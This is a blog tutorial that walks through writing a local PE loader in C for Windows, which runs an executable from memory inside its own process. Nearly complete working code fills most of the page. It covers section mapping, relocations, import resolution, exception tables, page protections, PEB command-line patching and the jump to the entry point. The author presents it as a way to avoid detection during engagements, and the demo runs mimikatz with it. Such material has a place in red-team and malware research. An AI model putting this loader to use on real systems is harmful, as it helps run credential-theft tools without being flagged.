
Writing a local PE Loader from scratch (for educational purposes)
=================================================================

[

![Sohail Saha](https://miro.medium.com/v2/resize:fill:64:64/1*tAvZqv2EzW4YT6yFzKJnEw.jpeg)





](/?source=post_page---byline--30e10cd88abc---------------------------------------)

[Sohail Saha](/?source=post_page---byline--30e10cd88abc---------------------------------------)

16 min read

·

Dec 1, 2024

[

](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F30e10cd88abc&operation=register&redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fhow-to-write-a-local-pe-loader-from-scratch-for-educational-purposes-30e10cd88abc&user=Sohail+Saha&userId=8e68869c881d&source=---header_actions--30e10cd88abc---------------------clap_footer------------------)

\--

[](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F30e10cd88abc&operation=register&redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fhow-to-write-a-local-pe-loader-from-scratch-for-educational-purposes-30e10cd88abc&source=---header_actions--30e10cd88abc---------------------bookmark_footer------------------)

Listen

Share

Press enter or click to view image in full size

totally not sus cake

When you execute a PE file, it gets loaded from disk, and a new process gets associated with it. The downside is, dropping an executable and creating a new process with it is very likely to get you flagged during an engagement if the executable is known.

Unlike the Windows loader, a custom PE loader can load a PE from its own memory without even launching an associated process for it. This post will take you through the whole loading process, explaining all the concepts needed to understand it.

How a PE loader works in theory
-------------------------------

A PE is just a file on disk. To get it running, it’s not enough to just read it into an executable memory and jump to its entry.

This is because a PE file and a PE image has differences between them. A PE image is the in-memory representation of a PE file on disk. When you execute a PE file, a PE image is first prepared. It is this image that is executed.

A PE image is structurally different than a PE file - different data is situated at different offsets, plus, there are data that are image-only. A PE loader takes care of creating the PE image structure from a PE file on disk. The below section will explain and walk you through each individual step of PE loading, along with code, such that in the end we’re left with a fully functioning loader.

Writing a local PE loader
-------------------------

We will start straight with writing the loader. Along the way, I will explain everything relevant about each step, both conceptually and with code. The objective is to write a loader that loads and executes any EXE locally, i.e, within its own process. I chose mimikatz for my demo. Feel free to choose anything.

### Creating a buffer for in-mem PE

First, we need to create a buffer and store the executable image file raw data in it. In a real scenario, our loader would act like a stager, and remotely fetch this raw data. My example loader, however, will only read the executable from disk, which although defeats the objective of “in-memory executable” for this example, but keeps things simple.

So, first things first, we need to read the PE file from disk. For this, we open a handle to the file, get its size, then reserve a buffer on heap for this. Then we read in the file into this buffer.

This buffer would be used from now on to read the actual PE file.

DWORD64 ReadImageFile(IN PCHAR imagePath, OUT LPVOID\* pBufImageFile) {  
 \*pBufImageFile = NULL;  
  
 // Read image file  
 HANDLE hImageFile = CreateFileA(imagePath, GENERIC\_READ, FILE\_SHARE\_READ, NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL);  
 if (hImageFile == INVALID\_HANDLE\_VALUE) {  
  PrintError("CreateFile");  
  goto \_CLEANUP;  
 }  
  
 LARGE\_INTEGER imageFileSize = {0};  
 ZeroMemoryCustom(&imageFileSize, sizeof(imageFileSize));  
 GetFileSizeEx(hImageFile, &imageFileSize);  
 if (imageFileSize.QuadPart == 0) {  
  PrintError("GetFileSize");  
  goto \_CLEANUP;  
 }  
  
 \*pBufImageFile = VirtualAlloc(NULL, imageFileSize.QuadPart, MEM\_RESERVE | MEM\_COMMIT, PAGE\_READWRITE);  
 if (\*pBufImageFile == NULL) {  
  PrintError("VirtualAlloc");  
  goto \_CLEANUP;  
 }  
  
 DWORD numOfBytesRead = 0;  
 if ((!ReadFile(hImageFile, \*pBufImageFile, imageFileSize.QuadPart, &numOfBytesRead, NULL)) || (numOfBytesRead != imageFileSize.QuadPart)) {  
  PrintError("ReadFile");  
  goto \_CLEANUP;  
 }  
  
\_CLEANUP:  
 if (hImageFile != INVALID\_HANDLE\_VALUE) {  
  CloseHandle(hImageFile);  
 }  
 return imageFileSize.QuadPart;  
}

### Processing the PE file

Now that we have the PE file read in a buffer, we can start extracting useful data from it. This data will help our loader. Below is a diagram of the structure of a PE.

Source: [tech-zealots.com](https://tech-zealots.com/)

The beginning of a PE file contains metadata for the rest of the file. This metadata is in the “File header” and the “Optional header”, both of which are a part of “Nt headers”. This is followed by “Section headers”, which contain metadata for each “Section” of a PE. A “Section” is a region serving a particular purpose for a PE. For an in-depth look into the PE structure, read: [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format).

So what our loader first needs to do, is to parse all the above metadata that the loading logic would need. With this metadata, the loader can access specific parts of the PE file, and copy them over to the appropriate offsets in the PE image. This metadata will also help in knowing what sorts of modification to make to parts of the PE image to make it ready for execution.

To store this metadata, a `struct` would be used. This struct would later be consulted by each individual step in the loader.

typedef struct \_PEImageFileProcessed {  
 IMAGE\_FILE\_HEADER FileHeader;  
 IMAGE\_OPTIONAL\_HEADER OptionalHeader;  
  
 BOOL IsDll;  
 DWORD64 ImageBase; // absolute  
 DWORD SizeOfImage;  
 DWORD AddressOfEntryPointOffset; // relative  
  
 WORD NumOfSections;  
 PIMAGE\_SECTION\_HEADER SectionHeaderFirst; // absolute  
  
 PIMAGE\_DATA\_DIRECTORY pDataDirectoryExport;  
 PIMAGE\_DATA\_DIRECTORY pDataDirectoryImport;  
 PIMAGE\_DATA\_DIRECTORY pDataDirectoryReloc;  
 PIMAGE\_DATA\_DIRECTORY pDataDirectoryException;  
} PEImageFileProcessed, \* PPEImageFileProcessed;

And now, to populate this `struct` ,

BOOL ProcessPEFile(IN LPVOID pBufImageFile, OUT PPEImageFileProcessed pPeImageFileProcessed) {  
 // Process headers  
 PIMAGE\_DOS\_HEADER pDosHeader = (PIMAGE\_DOS\_HEADER)pBufImageFile;  
 PIMAGE\_NT\_HEADERS pNtHeaders = (PIMAGE\_NT\_HEADERS)((DWORD64)pBufImageFile + (pDosHeader->e\_lfanew));  
 if (!(pNtHeaders->FileHeader.Characteristics & IMAGE\_FILE\_EXECUTABLE\_IMAGE)) {  
  printf("ProcessPEFile; input file is not a PE\\n");  
  return FALSE;  
 };  
  
 pPeImageFileProcessed->FileHeader = pNtHeaders->FileHeader;  
 pPeImageFileProcessed->OptionalHeader = pNtHeaders->OptionalHeader;  
  
 // Process misc  
 pPeImageFileProcessed->IsDll = (pNtHeaders->FileHeader.Characteristics & IMAGE\_FILE\_DLL) ? TRUE : FALSE;  
 pPeImageFileProcessed->SizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;  
 pPeImageFileProcessed->ImageBase = pNtHeaders->OptionalHeader.ImageBase;  
 pPeImageFileProcessed->AddressOfEntryPointOffset = pNtHeaders->OptionalHeader.AddressOfEntryPoint;  
  
 // Process section headers  
 pPeImageFileProcessed->NumOfSections = pNtHeaders->FileHeader.NumberOfSections;  
 pPeImageFileProcessed->SectionHeaderFirst = IMAGE\_FIRST\_SECTION(pNtHeaders);  
   
 // Process required sections explicitly  
 pPeImageFileProcessed->pDataDirectoryExport = &(pNtHeaders->OptionalHeader.DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_EXPORT\]);  
 pPeImageFileProcessed->pDataDirectoryImport = &(pNtHeaders->OptionalHeader.DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_IMPORT\]);  
 pPeImageFileProcessed->pDataDirectoryReloc = &(pNtHeaders->OptionalHeader.DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_BASERELOC\]);  
 pPeImageFileProcessed->pDataDirectoryException = &(pNtHeaders->OptionalHeader.DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_EXCEPTION\]);  
  
 return TRUE;  
}

Each metadata information is stored under a self-explanatory variable name. However, they would also be further explained as and when needed.

### Allocate space for in-mem PE

Firstly, we need to allocate some buffer to hold our loaded in-mem PE image. The metadata information we saved earlier will help us in this. The `SizeOfImage` stores the size (in bytes) of the PE image in memory. This is larger than the size of the PE file itself. One of the reasons is that, a PE image is much more than just the PE file.

This buffer must be entirely readwritable for now.

void AllocateMemoryForInMemPE(IN DWORD SizeOfImage, OUT LPVOID\* pBufInMemPE) {  
 \*pBufInMemPE = VirtualAlloc(NULL, SizeOfImage, MEM\_RESERVE | MEM\_COMMIT, PAGE\_READWRITE);  
 if (\*pBufInMemPE == NULL) {  
  PrintError("VirtualAlloc for AllocateMemoryForInMemPE");  
 }  
}  
  
DWORD64 pBufInMemPE = NULL;  
AllocateMemoryForInMemPE(peImageFileProcessed.SizeOfImage, &pBufInMemPE); // read the SizeOfImage from parsed metadata

### Copying over PE sections to the in-mem PE buffer

Next step, copying over the actual sections from the PE file to the PE image. Of course, the sections in a PE image are not the exact same as the sections of a PE file — the data stored in the PE image sections is often the result of some sort of modifications made to corresponding data in the PE file sections.

This means that simply copying over individual sections to the PE image buffer is not enough; there needs to be several modifications made to it once it’s been copied. So first, we must copy over each section to its respective offsets in the PE image. In later steps, we will modify this copy.

void CopySectionsToInMemPE(IN PPEImageFileProcessed pPeImageFileProcessed, IN LPVOID pBufImageFile, OUT LPVOID pBufInMemPE) {  
 for (int i = 0; i < pPeImageFileProcessed->NumOfSections; i++) {  
  IMAGE\_SECTION\_HEADER SectionHeader = pPeImageFileProcessed->SectionHeaderFirst\[i\];  
  
  MemCpy(  
   (DWORD64)pBufInMemPE + SectionHeader.VirtualAddress,  
   (DWORD64)pBufImageFile + SectionHeader.PointerToRawData,  
   SectionHeader.SizeOfRawData  
  );  
 }  
}

For this, `NumOfSections` contains the total number of sections, and `SectionHeaderFirst` is a pointer to the first section header. Each section in the PE file has an associated section header that describes the offset and size of the section. Section headers are stored in an array of `[IMAGE_SECTION_HEADER](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header)` structs.

The logic is simple — iterate over each section header, parse the offset and size of the section it represents, then copy `SizeOfRawData` number of bytes from the PE file (`pBufImageFile`)’s offset `PointerToRawData` to PE image (`pBufInMemPE`)’s offset `VirtualAddress` .

Unless otherwise stated, every “address” metadata you find in a PE will always be a Relative address, meaning that it is an offset, and needs to be added to the PE base address to get the actual address. In the above snippet, `PointerToRawData` and `VirtualAddress` are such offsets.

### Performing relocations

A PE image is supposed to be loaded at a particular absolute virtual address. This is represented by the `ImageBase` metadata we parsed. However, this happens rarely.

This `ImageBase` is important, because the compiler will often put in hardcoded addresses and offsets in the generated PE. These values depend upon the loader loading the PE at exactly `ImageBase` . Since this won’t likely happen, the compiler also includes something called “Relocation” data in the `.reloc` section.

Relocation data instructs the PE loader on how to fix those hardcoded addresses at runtime so that they work even when the image is not loaded at `ImageBase` . An example, say the `ImageBase` is 0x40000, and a particular hardcoded address is 0x40102. If the loader loads the image at 0x50000, the hardcoded address needs to be increased by 0x10000 (actual base — suggested base, i.e, 0x50000–0x40000). The `.reloc` section contains exactly this information — where to add the offset, and how to add the offset, such that 0x40102 becomes 0x50102.

Relocation data is pointed to by our metadata `pDataDirectoryReloc.VirtualAddress` (recall that this needs to be added to the PE image base to get the actual address).

The relocation data is stored in consecutive blocks of `[IMAGE_BASE_RELOCATION](https://0xrick.github.io/win-internals/pe7/)` structs. Each of these blocks store 2 things — metadata of the base memory block where the relocation is supposed to happen (this metadata is always of fixed size), and an array of `IMAGE_BASE_RELOCATION_ENTRY` structs that contain metadata for each individual relocation, i.e, the offset that needs to be added to the base memory block to get the actual target address, and the type of relocation.

In other words, there is one relocation that needs to be performed per `IMAGE_BASE_RELOCATION_ENTRY` . The relocation needs to be performed at `pBufInMemPE + IMAGE_BASE_RELOCATION.VirtualAddress + IMAGE_BASE_RELOCATION_ENTRY.Offset` address. And the relocation type is `IMAGE_BASE_RELOCATION_ENTRY.Type` .

`IMAGE_BASE_RELOCATION.SizeOfBlock` is the total size of each block, which includes the aforementioned metadata, and the array of `IMAGE_BASE_RELOCATION_ENTRY` . This size is variable, because the number of `IMAGE_BASE_RELOCATION_ENTRY` is variable. Therefore, the address of the first relocation entry is `IMAGE_BASE_RELOCATION + sizeof(IMAGE_BASE_RELOCATION)` (because the `sizeof` here reports only the size of the fixed metadata, and does not include the array of entries that follow).

Press enter or click to view image in full size

IMAGE\_BASE\_RELOCATION block, containing metadata and array of IMAGE\_BASE\_RELOCATION\_ENTRY

The type of relocation is mentioned by `IMAGE_BASE_RELOCATION_ENTRY.Type` . The types we are interested in, are for x86 and x64. The type will tell us how to add the image base difference (`ImageBase` — `pBufInMemPE`) to the address mentioned.

*   `IMAGE_REL_BASED_HIGH` : The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.
*   `IMAGE_REL_BASED_LOW` : The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word.
*   `IMAGE_REL_BASED_HIGHLOW` : The base relocation applies all 32 bits of the difference to the 32-bit field at offset.
*   `IMAGE_REL_BASED_DIR64` : The base relocation applies the difference to the 64-bit field at offset.
*   `IMAGE_REL_BASED_ABSOLUTE` : The base relocation is skipped. This type can be used to pad a block.

Putting it all together, here’s what the relocation looks like:

typedef struct \_IMAGE\_BASE\_RELOCATION\_ENTRY {  
 WORD Offset : 12;  
 WORD Type: 4;  
} IMAGE\_BASE\_RELOCATION\_ENTRY, \*PIMAGE\_BASE\_RELOCATION\_ENTRY;  
  
void PerformRelocationForInMemPE(IN PPEImageFileProcessed pPeImageFileProcessed, OUT LPVOID pBufInMemPE) {  
 PIMAGE\_BASE\_RELOCATION pImageBaseRelocation = (PIMAGE\_BASE\_RELOCATION)((DWORD64)pBufInMemPE + pPeImageFileProcessed->pDataDirectoryReloc->VirtualAddress);  
 DWORD NumImageBaseRelocationEntry = NULL;  
 PIMAGE\_BASE\_RELOCATION\_ENTRY pImageBaseRelocationEntry = NULL;  
 DWORD64 relocOffset = (DWORD64)pBufInMemPE - pPeImageFileProcessed->ImageBase;  
 DWORD64 relocAt = NULL;  
  
 // For each Base Relocation Block  
 while (pImageBaseRelocation->VirtualAddress != NULL) {  
  NumImageBaseRelocationEntry = (pImageBaseRelocation->SizeOfBlock - sizeof(IMAGE\_BASE\_RELOCATION)) / sizeof(IMAGE\_BASE\_RELOCATION\_ENTRY);  
  pImageBaseRelocationEntry = (PIMAGE\_BASE\_RELOCATION\_ENTRY)((DWORD64)pImageBaseRelocation + sizeof(IMAGE\_BASE\_RELOCATION));  
  relocAt = NULL;  
  
  // For each Base Relocation Block Entry  
  for (int i = 0; i < NumImageBaseRelocationEntry; i++) {  
   relocAt = ADD\_OFFSET\_TO\_POINTER(pBufInMemPE, pImageBaseRelocation->VirtualAddress + pImageBaseRelocationEntry\[i\].Offset);  
  
   switch (pImageBaseRelocationEntry\[i\].Type) {  
    case IMAGE\_REL\_BASED\_HIGH: // The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.  
     \*(PWORD)relocAt += HIWORD(relocOffset);  
     break;  
    case IMAGE\_REL\_BASED\_LOW: // The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word.  
     \*(PWORD)relocAt += LOWORD(relocOffset);  
     break;  
    case IMAGE\_REL\_BASED\_HIGHLOW: // The base relocation applies all 32 bits of the difference to the 32-bit field at offset.  
     \*(PDWORD)relocAt += (DWORD)relocOffset;  
     break;  
    case IMAGE\_REL\_BASED\_DIR64: // The base relocation applies the difference to the 64-bit field at offset.  
     \*(PDWORD64)relocAt += relocOffset;  
     break;  
    case IMAGE\_REL\_BASED\_ABSOLUTE: // The base relocation is skipped. This type can be used to pad a block.  
    default:  
     break;  
   }  
  }  
  
  // Move on to next relocation block  
  pImageBaseRelocation = ADD\_OFFSET\_TO\_POINTER(pImageBaseRelocation, pImageBaseRelocation->SizeOfBlock);  
 }  
}

### Fixing imports

Next, we’re about to fix the imports. A dynamically-linked PE will import functions from other modules, such as system DLLs. This import information is stored in the `.idata` section, in arrays of `[IMAGE_IMPORT_DESCRIPTOR](https://0xrick.github.io/win-internals/pe6/)` structs.

Each `IMAGE_IMPORT_DESCRIPTOR` represents one library. Each function that need to be imported from this library are in `IMAGE_THUNK_DATA` structs, pointed to by `IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk` . This thunk data contains either the ordinal of the function (`.Ordinal`) or the name of the function (`.AddressOfData`).

The function addresses found are to be added in corresponding `IMAGE_THUNK_DATA` structs, pointed to by `IMAGE_IMPORT_DESCRIPTOR.FirstThunk` . Yes, we use `OriginalFirstThunk` to locate the function, and store the found functions in `FirstThunk` .

To know whether we are to use the ordinal or name of the function, we check the bitfields of the ordinal, and check if it matches `IMAGE_ORDINAL_FLAG` . So all we need to check is if `IMAGE_THUNK_DATA.u1.Ordinal & IMAGE_ORDINAL_FLAG` is zero. If it is zero, we use the function name. If non-zero, we use the ordinal.

The function name is stored in a `IMAGE_IMPORT_BY_NAME` struct, pointed to by `IMAGE_THUNK_DATA.u1.AddressOfData` .

With the ordinal or name, we can use `GetProcAddress` to locate the address of the function we need. Once done, we set this address in the corresponding `IMAGE_THUNK_DATA` struct pointed to by `IMAGE_IMPORT_DESCRIPTOR.FirstThunk.`

In other words, here’s the steps needed to resolve the second function of the third library:

1.  Access `IMAGE_THUNK_DATA` at `IMAGE_IMPORT_DESCRIPTOR[2].OriginalFirstThunk[1]` , and use the ordinal or the name to locate the function.
2.  Access `IMAGE_THUNK_DATA` at `IMAGE_IMPORT_DESCRIPTOR[2].FirstThunk[1]` and set the above found function address at `.Function` .

The code for the above would look like this:

BOOL FixImportsForInMemPE(IN PPEImageFileProcessed pPeImageFileProcessed, OUT LPVOID pBufInMemPE) {  
 PIMAGE\_IMPORT\_DESCRIPTOR pImageImportDescriptor = ADD\_OFFSET\_TO\_POINTER(pBufInMemPE, pPeImageFileProcessed->pDataDirectoryImport->VirtualAddress);  
 PCHAR dllName = NULL;  
 PIMAGE\_THUNK\_DATA pOriginalFirstThunk = NULL;  
 PIMAGE\_THUNK\_DATA pFirstThunk = NULL;  
 BOOL isOrdinal = FALSE;  
 HMODULE hModule = INVALID\_HANDLE\_VALUE;  
 PIMAGE\_IMPORT\_BY\_NAME pImageImportByName = { 0 };  
 LPVOID funcAddress = NULL;  
  
 // Iterate through Image Import Descriptors  
 while (pImageImportDescriptor->FirstThunk != NULL && pImageImportDescriptor->OriginalFirstThunk != NULL) {  
  // Get module handle to required DLL; load if not already loaded  
  dllName = ADD\_OFFSET\_TO\_POINTER(pBufInMemPE, pImageImportDescriptor->Name);  
  hModule = GetModuleHandleA(dllName);  
  if (hModule == INVALID\_HANDLE\_VALUE || hModule == NULL) {  
   hModule = LoadLibraryA(dllName);  
   if (hModule == INVALID\_HANDLE\_VALUE || hModule == NULL) {  
    PrintError("GetModuleHandle");  
    return FALSE;  
   }  
  }  
  
  // Iterate through each Thunk  
  pOriginalFirstThunk = ADD\_OFFSET\_TO\_POINTER(pBufInMemPE, pImageImportDescriptor->OriginalFirstThunk);  
  pFirstThunk = ADD\_OFFSET\_TO\_POINTER(pBufInMemPE, pImageImportDescriptor->FirstThunk);  
  funcAddress = NULL;  
  while (pOriginalFirstThunk->u1.Function != NULL && pFirstThunk->u1.Function) {  
   isOrdinal = ((pOriginalFirstThunk->u1.Ordinal & IMAGE\_ORDINAL\_FLAG) == 0) ? FALSE : TRUE;  
     
   // Get the function address  
   if (isOrdinal) {  
    funcAddress = GetProcAddress(hModule, IMAGE\_ORDINAL(pOriginalFirstThunk->u1.Ordinal));  
   }  
   else {  
    pImageImportByName = ADD\_OFFSET\_TO\_POINTER(pBufInMemPE, pOriginalFirstThunk->u1.AddressOfData);  
    funcAddress = GetProcAddress(hModule, pImageImportByName->Name);  
   }  
   if (funcAddress == NULL) {  
    PrintError("GetProcAddress");  
    return FALSE;  
   }  
  
   // Set found function address  
   pFirstThunk->u1.Function = funcAddress;  
  
   // Move on to next thunk  
   pOriginalFirstThunk++;  
   pFirstThunk++;  
  }  
  
  // Move on to next Image Import Descriptor  
  pImageImportDescriptor++;  
 }  
  
 return TRUE;  
}

### Registering exception handlers

Next, we need to fix the exception handlers. Stored in the `.pdata` section is a function table for exception handlers. Each entry of this table is a `RUNTIME_FUNCTION` struct.

Fortunately for us, there exists a function to register this table — `RtlAddFunctionTable` . All we need to do is pass it a reference to the exception handlers function table, and it takes care of the rest.

BOOL RegisterExceptionHandlers(IN PPEImageFileProcessed pPeImageFileProcessed, OUT LPVOID pBufInMemPE) {  
 if (pPeImageFileProcessed->pDataDirectoryException->VirtualAddress != NULL) {  
  PRUNTIME\_FUNCTION pFunctionTable = ADD\_OFFSET\_TO\_POINTER(pBufInMemPE, pPeImageFileProcessed->pDataDirectoryException->VirtualAddress);  
  if (!RtlAddFunctionTable(  
   pFunctionTable, // Pointer to exception function table  
   (pPeImageFileProcessed->pDataDirectoryException->Size / sizeof(RUNTIME\_FUNCTION)), // Number of RUNTIME\_FUNCTIONs in the table  
   pBufInMemPE // Base of the in-mem PE  
  )) {  
   PrintError("RtlAddFunctionTable");  
   return FALSE;  
  }  
  else {  
   return TRUE;  
  }  
 }  
}

### Assigning correct permissions to the sections

Next step is to assign correct [memory access permissions](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants) to the sections. If you recall, we set the entire `pBufInMemPE` as `RW` initially. However, not all sections are `RW` . Some are `R`, others are `RX` .

Each section’s header has a `.Characteristics` bitfield that stores the correct access permission. To check with access permission is denoted, do `SectionHeader.Characteristics & BITFIELD_FLAG` and see if it’s non-zero. For example, if we get `SectionHeader.Characterists & IMAGE_SCN_MEM_READ` as non-zero, but that with `IMAGE_SCN_MEM_WRITE` and `IMAGE_SCN_MEM_EXECUTE` as zero, it means the section is readable, but neither writable nor executable. So the page permission would be `PAGE_READONLY.`

Therefore, all we need to do is iterate over each section header, check the `.Characteristics` property, get the correct permission, then assign it to the section using `[VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)` .

BOOL AssignCorrectPagePerms(IN PPEImageFileProcessed pPeImageFileProcessed, OUT LPVOID pBufInMemPE) {  
 IMAGE\_SECTION\_HEADER SectionHeader = {0};  
 DWORD newProtection = NULL, oldProtection = NULL;  
  
 // Iterate through each Section header  
 for (int i = 0; i < pPeImageFileProcessed->NumOfSections; i++) {  
  SectionHeader = pPeImageFileProcessed->SectionHeaderFirst\[i\];  
  
  // Get correct permission to set  
  if ((SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_EXECUTE) && !(SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_READ) && !(SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_WRITE)) {  
   newProtection = PAGE\_EXECUTE;  
  }  
  else if ((SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_EXECUTE) && (SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_READ) && !(SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_WRITE)) {  
   newProtection = PAGE\_EXECUTE\_READ;  
  }  
  else if ((SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_EXECUTE) && (SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_READ) && (SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_WRITE)) {  
   newProtection = PAGE\_EXECUTE\_READWRITE;  
  }  
  else if (!(SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_EXECUTE) && (SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_READ) && !(SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_WRITE)) {  
   newProtection = PAGE\_READONLY;  
  }  
  else if (!(SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_EXECUTE) && (SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_READ) && (SectionHeader.Characteristics & IMAGE\_SCN\_MEM\_WRITE)) {  
   newProtection = PAGE\_READWRITE;  
  }  
  else {  
   return FALSE;  
  }  
  
  // Set correct permission  
  if (!VirtualProtect(  
   ADD\_OFFSET\_TO\_POINTER(pBufInMemPE, SectionHeader.VirtualAddress),  
   SectionHeader.SizeOfRawData,  
   newProtection,  
   &oldProtection  
  )) {  
   PrintError("VirtualProtect");  
   return FALSE;  
  }  
 }  
 return TRUE;  
}

### Fixing commandline

Next up is fixing commandline. If we don’t do this, and move on to executing the in-mem PE, the commandline that it would see is the commandline we passed to our loader. That’s not what we want. What we want, is for the in-mem PE to see the custom commandline that we provide.

A PE gets its commandline from its current process’s [PEB](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb). The PEB is an object that stores information about a process. In this case, since we don’t create a new process, but rather load the PE in our current process, the in-mem PE would access our (the loader’s) PEB.

To make sure the in-mem PE gets the correct commandline, we need to modify our PEB, specifically the `.ProcessParameters` , which is a `RTL_USER_PROCESS_PARAMETERS` struct. This contains `.CommandLine` and `.ImagePathName` , each of which is a `UNICODE_STRING` struct. The `.ImagePathName` is of the form `C:\path\to\executable.exe` , whereas the `.CommandLine` is of the form `"C:\path\to\executable.exe" param1 param2` .

An executable’s entry point code always receives a pointer to the arguments passed to the program, often denoted by `char* argv[]` . In the above example, `argv[0]` would point to `"C:\path\to\executable.exe"` , `argv[1]` would point to `param1` , and so on. This is prepared from `PEB.ProcessParameters.CommandLine` .

Therefore, all we need to do is to patch `.CommandLine` , such that it looks like what the in-mem PE’s actual commandline would look like. The `"C:\path\to\executable.exe"` part can be anything, since process arguments `argv[n]` start pointing only to what’s after it, i.e, from `param1` .

To first get the `PEB` , read off the `GS` register, which holds the address of the `[TEB](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb)` , which represents a thread. Each `TEB` contains a pointer to the `PEB` of the process that the thread belongs to.

The below code achieves all this. `pInMemPeArgs` is a pointer to a string like `param1 param2` , that is, a single string containing parameters separated by space.

PPEB GetCurrentPEB() {  
#ifdef \_M\_X64  
 return (PPEB)\_\_readgsqword(12 \* sizeof(PVOID));  
#else  
 return (PPEB)\_\_readfsdword(12 \* sizeof(PVOID));  
#endif  
}  
  
void FixCommandLine(PProcessParametersStore pProcessParamsStore, PCHAR pInMemPeArgs) {  
 // Get current PE's command-line args  
 PPEB pPeb = GetCurrentPEB();  
  
 // Save original command line  
 ZeroMemoryCustom(pProcessParamsStore, sizeof(ProcessParametersStore));  
 pProcessParamsStore->commandlineLenOrig = pPeb->ProcessParameters->CommandLine.Length;  
 pProcessParamsStore->commandlineOrig = VirtualAlloc(NULL, pPeb->ProcessParameters->CommandLine.Length, MEM\_RESERVE | MEM\_COMMIT, PAGE\_READWRITE);  
 if (pProcessParamsStore->commandlineOrig != NULL) {  
  MemCpy(pProcessParamsStore->commandlineOrig, pPeb->ProcessParameters->CommandLine.Buffer, pPeb->ProcessParameters->CommandLine.Length);  
 }  
  
 // If there are no command line args to be passed to the in-mem PE  
 if (pInMemPeArgs == NULL) {  
  pPeb->ProcessParameters->CommandLine.Length = 0;  
  pPeb->ProcessParameters->CommandLine.MaximumLength = 0;  
  ZeroMemoryCustom(pPeb->ProcessParameters->CommandLine.Buffer, pProcessParamsStore->commandlineLenOrig);  
 }  
 // If there are command line args to be passed to the in-mem PE  
 else {  
  // Prepare new command line  
  DWORD inMemPeArgsWLen = pPeb->ProcessParameters->ImagePathName.Length + (StrLen(pInMemPeArgs) \* sizeof(WCHAR)) + (3 \* sizeof(WCHAR)); // Image file path + args to in-mem PE + null terminator + 2 double-quotes + one space  
  PWCHAR pInMemPeArgsW = VirtualAlloc(NULL, inMemPeArgsWLen, MEM\_RESERVE | MEM\_COMMIT, PAGE\_READWRITE);  
  if (pInMemPeArgsW == NULL) return;  
  ZeroMemoryCustom(pInMemPeArgsW, inMemPeArgsWLen);  
  MemCpy(pInMemPeArgsW + 0, L"\\"", 1);  
  MemCpy(pInMemPeArgsW + 1, pPeb->ProcessParameters->ImagePathName.Buffer, pPeb->ProcessParameters->ImagePathName.Length);  
  MemCpy(pInMemPeArgsW + (pPeb->ProcessParameters->ImagePathName.Length / 2) + 1, L"\\"", 1);  
  MemCpy(pInMemPeArgsW + (pPeb->ProcessParameters->ImagePathName.Length / 2) + 2, L" ", 1);  
  CharStringToWCharString(pInMemPeArgs, StrLen(pInMemPeArgs), pInMemPeArgsW + (pPeb->ProcessParameters->ImagePathName.Length / 2) + 3);  
  
  // Set new command line len  
  pPeb->ProcessParameters->CommandLine.Length = inMemPeArgsWLen;  
  pPeb->ProcessParameters->CommandLine.MaximumLength = inMemPeArgsWLen;  
  
  // Set new command line  
  ZeroMemoryCustom(pPeb->ProcessParameters->CommandLine.Buffer, pProcessParamsStore->commandlineLenOrig);  
  MemCpy(pPeb->ProcessParameters->CommandLine.Buffer, pInMemPeArgsW, inMemPeArgsWLen);  
  ZeroMemoryCustom(pInMemPeArgsW, inMemPeArgsWLen);  
  VirtualFree(pInMemPeArgsW, 0, MEM\_RELEASE);  
 }  
}

### Jump to entry

At this point, our in-mem PE is loaded, and ready to be executed.

All we need to do, is find out whether the PE is a DLL or not, and execute the `.AddressOfEntryPointOffset` relative address accordingly.

typedef BOOL(\*DLLMAIN)(HINSTANCE, DWORD, LPVOID);  
typedef BOOL(\*MAIN)(DWORD, PCHAR);  
  
void JumpToEntry(IN PPEImageFileProcessed pPeImageFileProcessed, IN LPVOID pBufInMemPE) {  
 LPVOID pEntry = ADD\_OFFSET\_TO\_POINTER(pBufInMemPE, pPeImageFileProcessed->AddressOfEntryPointOffset);  
 // For DLL  
 if (pPeImageFileProcessed->IsDll) {  
  ((DLLMAIN)pEntry)(pBufInMemPE, DLL\_PROCESS\_ATTACH, NULL); // dllmain of DLL  
 }  
 // For other executables  
 else {  
  ((MAIN)pEntry)(1, NULL); // main of any other executable  
 }  
}

Press enter or click to view image in full size

Executing mimikatz locally

Entire Code
-----------

The entire code for this loader is available on my `malware-study` repo, where I put all my code for my malware research.

[

